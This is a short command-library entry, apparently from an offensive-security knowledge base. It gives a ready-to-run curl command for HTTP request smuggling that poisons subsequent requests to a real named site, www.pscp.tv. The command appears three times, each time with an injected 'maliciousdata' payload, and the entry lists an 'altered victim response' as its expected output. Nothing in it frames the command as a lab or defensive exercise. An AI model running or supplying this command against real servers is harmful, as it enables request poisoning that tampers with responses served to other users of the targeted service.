---
data: >-
  curl -i -s -k -X POST 'https://www.pscp.tv/' -H 'Content-Length: 100' -H
  'Transfer-Encoding: chunked' --data '0\r\nPOST /edit HTTP/1.1\r\nHost:
  www.pscp.tv\r\nContent-Length: 10\r\n\r\nmaliciousdata'
tags:
  - http-smuggling
  - request-poisoning
type: command
executor: bash
platforms:
  - Linux
  - macOS
  - Windows
id: 9368da06-b57e-4cf8-bec8-41793e261352
created_at: '2025-12-13T09:01:21.902Z'
updated_at: '2025-12-13T09:01:21.902Z'
verified: false
validated: true
submitted: true
---
# Craft HTTP Smuggling Poisoning Request

## Command

```bash
curl -i -s -k -X POST 'https://www.pscp.tv/' -H 'Content-Length: 100' -H 'Transfer-Encoding: chunked' --data '0\r\nPOST /edit HTTP/1.1\r\nHost: www.pscp.tv\r\nContent-Length: 10\r\n\r\nmaliciousdata'
```

## Description

This command injects a payload to poison subsequent requests.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| `-H 'Content-Length: 100'` | Sets oversized length | Yes |
| `--data '0\r\nPOST ...'` | Injects malicious POST | Yes |

## Examples

### Basic Usage

```bash
curl -i -s -k -X POST 'https://www.pscp.tv/' -H 'Content-Length: 100' -H 'Transfer-Encoding: chunked' --data '0\r\nPOST /edit HTTP/1.1\r\nHost: www.pscp.tv\r\nContent-Length: 10\r\n\r\nmaliciousdata'
```

## Expected Output

Altered victim response, such as modified data.

## Related

- [[procedures/Poison-Victim-Requests-via-Injected-Payloads-in-HTTP-Smuggling]]
